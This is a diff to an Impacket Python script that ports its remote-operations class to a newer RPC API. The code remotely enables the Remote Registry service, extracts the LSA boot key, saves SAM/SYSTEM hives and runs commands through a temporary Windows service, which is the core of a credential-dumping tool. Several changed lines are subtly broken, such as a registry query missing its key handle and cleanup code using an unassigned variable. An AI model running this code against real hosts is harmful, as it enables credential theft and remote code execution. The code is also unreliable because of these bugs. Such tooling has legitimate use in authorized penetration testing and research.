@@ -1,5 +1,5 @@
 #!/usr/bin/python
-# Copyright (c) 2003-2013 CORE Security Technologies
+# Copyright (c) 2003-2014 CORE Security Technologies
 #
 # This software is provided under a slightly modified version
 # of the Apache Software License. See the accompanying LICENSE file
@@ -40,7 +40,8 @@
 #
 from impacket import version, smbconnection, winregistry, ntlm
 from impacket.smbconnection import SMBConnection
-from impacket.dcerpc import dcerpc, transport, winreg, svcctl
+from impacket.dcerpc import dcerpc, transport, winreg
+from impacket.dcerpc.v5 import rpcrt, transport, rrp, scmr
 from impacket.winregistry import hexdump
 from impacket.structure import Structure
 from impacket.ese import ESENT_DB
@@ -256,14 +257,12 @@ class RemoteOperations:
         self.__serviceName = 'RemoteRegistry'
         self.__stringBindingWinReg = r'ncacn_np:445[\pipe\winreg]'
         self.__stringBindingSvcCtl = r'ncacn_np:445[\pipe\svcctl]'
-        self.__dce = None
-        self.__winreg = None
+        self.__rrp = None
         self.__bootKey = ''
         self.__disabled = False
         self.__shouldStop = False
         self.__started = False
-        self.__dce2 = None
-        self.__svcctl = None
+        self.__scmr = None
         self.__regHandle = None
         self.__batchFile = '%TEMP%\\execute.bat' 
         self.__shell = '%COMSPEC% /Q /c '
@@ -275,31 +274,29 @@ class RemoteOperations:
     def __connectSvcCtl(self):
         rpc = transport.DCERPCTransportFactory(self.__stringBindingSvcCtl)
         rpc.set_smb_connection(self.__smbConnection)
-        self.__dce2 = dcerpc.DCERPC_v5(rpc)
-        self.__dce2.connect()
-        self.__dce2.bind(svcctl.MSRPC_UUID_SVCCTL)
-        self.__svcctl = svcctl.DCERPCSvcCtl(self.__dce2)
+        self.__scmr = rpc.get_dce_rpc()
+        self.__scmr.connect()
+        self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
 
     def __connectWinReg(self):
         rpc = transport.DCERPCTransportFactory(self.__stringBindingWinReg)
         rpc.set_smb_connection(self.__smbConnection)
-        self.__dce = dcerpc.DCERPC_v5(rpc)
-        self.__dce.connect()
-        self.__dce.bind(winreg.MSRPC_UUID_WINREG)
-        self.__winreg = winreg.DCERPCWinReg(self.__dce)
+        self.__rrp = rpc.get_dce_rpc()
+        self.__rrp.connect()
+        self.__rrp.bind(rrp.MSRPC_UUID_RRP)
 
     def getMachineNameAndDomain(self):
         return self.__smbConnection.getServerName(), self.__smbConnection.getServerDomain()
 
     def getDefaultLoginAccount(self):
         try:
-            ans = self.__winreg.regOpenKey(self.__regHandle, 'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon', winreg.KEY_READ)
-            keyHandle = ans.get_context_handle()
-            ans = self.__winreg.regQueryValue(keyHandle, 'DefaultUserName', 512)
-            username = ans.get_data()
-            ans = self.__winreg.regQueryValue(keyHandle, 'DefaultDomainName', 512)
-            domain = ans.get_data()
-            self.__winreg.regCloseKey(keyHandle)
+            ans = rrp.hBaseRegOpenKey(self.__rrp, self.__regHandle, 'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon')
+            keyHandle = ans['phkResult']
+            dataType, dataValue = rrp.hBaseRegQueryValue(self.__rrp, keyHandle, 'DefaultUserName')
+            username = dataValue[:-1]
+            dataType, dataValue = rrp.hBaseRegQueryValue(self.__rrp, 'DefaultDomainName')
+            domain = dataValue[:-1]
+            rrp.hBaseRegCloseKey(self.__rrp, keyHandle)
             if len(domain) > 0:
                 return '%s\\%s' % (domain,username)
             else:
@@ -310,11 +307,11 @@ class RemoteOperations:
     def getServiceAccount(self, serviceName):
         try:
             # Open the service
-            ans = self.__svcctl.OpenServiceW(self.__scManagerHandle, serviceName.encode('utf-16le'))
-            serviceHandle = ans['ContextHandle']
-            resp = self.__svcctl.QueryServiceConfigW(serviceHandle)
-            account = resp['QueryConfig']['ServiceStartName'].decode('utf-16le')
-            self.__svcctl.CloseServiceHandle(serviceHandle)
+            ans = scmr.hROpenServiceW(self.__scmr, self.__scManagerHandle, self.__serviceName)
+            serviceHandle = ans['lpServiceHandle']
+            resp = scmr.hRQueryServiceConfigW(self.__scmr, serviceHandle)
+            account = resp['lpServiceConfig']['lpServiceStartName'][:-1]
+            scmr.hRCloseServiceHandle(self.__scmr, serviceHandle)
             if account.startswith('.\\'):
                 account = account[2:]
             return account
@@ -324,18 +321,18 @@ class RemoteOperations:
  
     def __checkServiceStatus(self):
         # Open SC Manager
-        ans = self.__svcctl.OpenSCManagerW()
-        self.__scManagerHandle = ans['ContextHandle']
+        ans = scmr.hROpenSCManagerW(self.__scmr)
+        self.__scManagerHandle = ans['lpScHandle']
         # Now let's open the service
-        ans = self.__svcctl.OpenServiceW(self.__scManagerHandle, self.__serviceName.encode('utf-16le'))
-        self.__serviceHandle = ans['ContextHandle']
+        ans = scmr.hROpenServiceW(self.__scmr, self.__scManagerHandle, self.__serviceName)
+        self.__serviceHandle = ans['lpServiceHandle']
         # Let's check its status
-        ans = self.__svcctl.QueryServiceStatus(self.__serviceHandle)
-        if ans['CurrentState'] == svcctl.SERVICE_STOPPED:
+        ans = scmr.hRQueryServiceStatus(self.__scmr, self.__serviceHandle)
+        if ans['lpServiceStatus']['dwCurrentState'] == scmr.SERVICE_STOPPED:
             logging.info('Service %s is in stopped state'% self.__serviceName)
             self.__shouldStop = True
             self.__started = False
-        elif ans['CurrentState'] == svcctl.SERVICE_RUNNING:
+        elif ans['lpServiceStatus']['dwCurrentState'] == scmr.SERVICE_RUNNING:
             logging.debug('Service %s is already running'% self.__serviceName)
             self.__shouldStop = False
             self.__started  = True
@@ -344,13 +341,13 @@ class RemoteOperations:
 
         # Let's check its configuration if service is stopped, maybe it's disabled :s
         if self.__started == False:
-            ans = self.__svcctl.QueryServiceConfigW(self.__serviceHandle)
-            if ans['QueryConfig']['StartType'] == 0x4:
+            ans = scmr.hRQueryServiceConfigW(self.__scmr,self.__serviceHandle)
+            if ans['lpServiceConfig']['dwStartType'] == 0x4:
                 logging.info('Service %s is disabled, enabling it'% self.__serviceName)
                 self.__disabled = True
-                self.__svcctl.ChangeServiceConfigW(self.__serviceHandle, startType = 0x3)
+                scmr.hRChangeServiceConfigW(self.__scmr, self.__serviceHandle, dwStartType = 0x3)
             logging.info('Starting service %s' % self.__serviceName)
-            self.__svcctl.StartServiceW(self.__serviceHandle)
+            scmr.hRStartServiceW(self.__scmr,self.__serviceHandle)
             time.sleep(1)
 
     def enableRegistry(self):
@@ -362,35 +359,32 @@ class RemoteOperations:
         # First of all stop the service if it was originally stopped
         if self.__shouldStop is True:
             logging.info('Stopping service %s' % self.__serviceName)
-            self.__svcctl.StopService(self.__serviceHandle)
+            scmr.hRControlService(self.__scmr, self.__serviceHandle, scmr.SERVICE_CONTROL_STOP)
         if self.__disabled is True:
             logging.info('Restoring the disabled state for service %s' % self.__serviceName)
-            self.__svcctl.ChangeServiceConfigW(self.__serviceHandle, startType = 0x4)
-
+            scmr.hRChangeServiceConfigW(self.__scmr, self.__serviceHandle, dwStartType = 0x4)
         if self.__serviceDeleted is False:
             # Check again the service we created does not exist, starting a new connection
             # Why?.. Hitting CTRL+C might break the whole existing DCE connection
             try:
                 rpc = transport.DCERPCTransportFactory(r'ncacn_np:%s[\pipe\svcctl]' % self.__smbConnection.getRemoteHost())
-                rpc.set_dport(445)
                 if hasattr(rpc, 'set_credentials'):
                     # This method exists only for selected protocol sequences.
                     rpc.set_credentials(*self.__smbConnection.getCredentials())
-                self.__dce2 = dcerpc.DCERPC_v5(rpc)
-                self.__dce2.connect()
-                self.__dce2.bind(svcctl.MSRPC_UUID_SVCCTL)
-                self.__svcctl = svcctl.DCERPCSvcCtl(self.__dce2)
+                self.__scmr = rpc.get_dce_rpc()
+                self.__scmr.connect()
+                self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
                 # Open SC Manager
-                ans = self.__svcctl.OpenSCManagerW()
-                self.__scManagerHandle = ans['ContextHandle']
+                ans = scmr.hROpenSCManagerW(self.__scmr)
+                self.__scManagerHandle = ans['lpScHandle']
                 # Now let's open the service
-                resp = self.__svcctl.OpenServiceW(self.__scManagerHandle, self.__tmpServiceName)
-                service = resp['ContextHandle']
-                self.__svcctl.DeleteService(service)
-                resp = self.__svcctl.StopService(service)
-                self.__svcctl.CloseServiceHandle(service)
-                self.__svcctl.CloseServiceHandle(self.__serviceHandle)
-                self.__svcctl.CloseServiceHandle(self.__scManagerHandle)
+                scmr.hROpenServiceW(self.__scmr, self.__scManagerHandle, self.__tmpServiceName)
+                service = resp['lpServiceHandle']
+                scmr.hRDeleteService(self.__scmr, service)
+                scmr.hRControlService(self.__scmr, service, scmr.SERVICE_CONTROL_STOP)
+                scmr.hRCloseServiceHandle(self.__scmr, service)
+                scmr.hRCloseServiceHandle(self.__scmr, self.__serviceHandle)
+                scmr.hRCloseServiceHandle(self.__scmr, self.__scManagerHandle)
                 rpc.disconnect()
             except Exception, e:
                 # If service is stopped it'll trigger an exception
@@ -401,20 +395,20 @@ class RemoteOperations:
 
     def finish(self):
         self.__restore()
-        self.__dce.disconnect()
-        self.__dce2.disconnect()
+        self.__rrp.disconnect()
+        self.__scmr.disconnect()
 
     def getBootKey(self):
         bootKey = ''
-        ans = self.__winreg.openHKLM()
-        self.__regHandle = ans.get_context_handle()
+        ans = rrp.hOpenLocalMachine(self.__rrp)
+        self.__regHandle = ans['phKey']
         for key in ['JD','Skew1','GBG','Data']:
             logging.debug('Retrieving class info for %s'% key)
-            ans = self.__winreg.regOpenKey(self.__regHandle, 'SYSTEM\\CurrentControlSet\\Control\\Lsa\\%s' % key,winreg.KEY_READ)
-            keyHandle = ans.get_context_handle()
-            ans = self.__winreg.regGetClassInfo(keyHandle)
-            bootKey = bootKey + ans.get_class_data()[:-1]
-            self.__winreg.regCloseKey(keyHandle)
+            ans = rrp.hBaseRegOpenKey(self.__rrp, self.__regHandle, 'SYSTEM\\CurrentControlSet\\Control\\Lsa\\%s' % key)
+            keyHandle = ans['phkResult']
+            ans = rrp.hBaseRegQueryInfoKey(self.__rrp,keyHandle)
+            bootKey = bootKey + ans['lpClassOut'][:-1]
+            rrp.hBaseRegCloseKey(self.__rrp, keyHandle)
 
         transforms = [ 8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7 ]
 
@@ -429,14 +423,12 @@ class RemoteOperations:
 
     def checkNoLMHashPolicy(self):
         logging.debug('Checking NoLMHash Policy')
-        ans = self.__winreg.openHKLM()
-        self.__regHandle = ans.get_context_handle()
+        ans = rrp.hOpenLocalMachine(self.__rrp)
+        self.__regHandle = ans['phKey']
 
-        ans = self.__winreg.regOpenKey(self.__regHandle, 'SYSTEM\\CurrentControlSet\\Control\\Lsa',winreg.KEY_READ)
-        keyHandle = ans.get_context_handle()
-        ans = self.__winreg.regQueryValue(keyHandle, 'NoLmHash', 10)
-        noLMHash = ans.get_data()
-
+        ans = rrp.hBaseRegOpenKey(self.__rrp, self.__regHandle, 'SYSTEM\\CurrentControlSet\\Control\\Lsa')
+        keyHandle = ans['phkResult']
+        dataType, noLMHash = rrp.hBaseRegQueryValue(self.__rrp, keyHandle, 'NoLmHash')
         if noLMHash != 1:
             logging.debug('LMHashes are being stored')
             return False
@@ -446,15 +438,16 @@ class RemoteOperations:
 
     def __retrieveHive(self, hiveName):
         tmpFileName = ''.join([random.choice(string.letters) for i in range(8)]) + '.tmp'
-        ans = self.__winreg.openHKLM()
-        regHandle = ans.get_context_handle()
-        ans = self.__winreg.regCreateKey(regHandle, hiveName)
-        if ans.get_return_code() != 0:
+        ans = rrp.hOpenLocalMachine(self.__rrp)
+        regHandle = ans['phKey']
+        try:
+            ans = rrp.hBaseRegCreateKey(self.__rrp, regHandle, hiveName)
+        except:
             raise Exception("Can't open %s hive" % hiveName)
-        keyHandle = ans.get_context_handle()
-        resp = self.__winreg.regSaveKey(keyHandle, tmpFileName)
-        self.__winreg.regCloseKey(keyHandle)
-        self.__winreg.regCloseKey(regHandle)
+        keyHandle = ans['phkResult']
+        resp = rrp.hBaseRegSaveKey(self.__rrp, keyHandle, tmpFileName)
+        rrp.hBaseRegCloseKey(self.__rrp, keyHandle)
+        rrp.hBaseRegCloseKey(self.__rrp, regHandle)
         # Now let's open the remote file, so it can be read later
         remoteFileName = RemoteFile(self.__smbConnection, 'SYSTEM32\\'+tmpFileName)
         return remoteFileName
@@ -473,16 +466,15 @@ class RemoteOperations:
         command += ' & ' + 'del ' + self.__batchFile 
 
         self.__serviceDeleted = False
-        resp = self.__svcctl.CreateServiceW(self.__scManagerHandle, self.__tmpServiceName, self.__tmpServiceName, command.encode('utf-16le'))
-        service = resp['ContextHandle']
+        resp = scmr.hRCreateServiceW(self.__scmr, self.__scManagerHandle, self.__tmpServiceName, self.__tmpServiceName, lpBinaryPathName=command)
+        service = resp['lpServiceHandle']
         try:
-           self.__svcctl.StartServiceW(service)
+           scmr.hRStartServiceW(self.__scmr, service)
         except:
            pass
-        self.__svcctl.DeleteService(service)
+        scmr.hRDeleteService(self.__scmr, service)
         self.__serviceDeleted = True
-        self.__svcctl.CloseServiceHandle(service)
-
+        scmr.hRCloseServiceHandle(self.__scmr, service)
     def __answer(self, data):
         self.__answerTMP += data
 
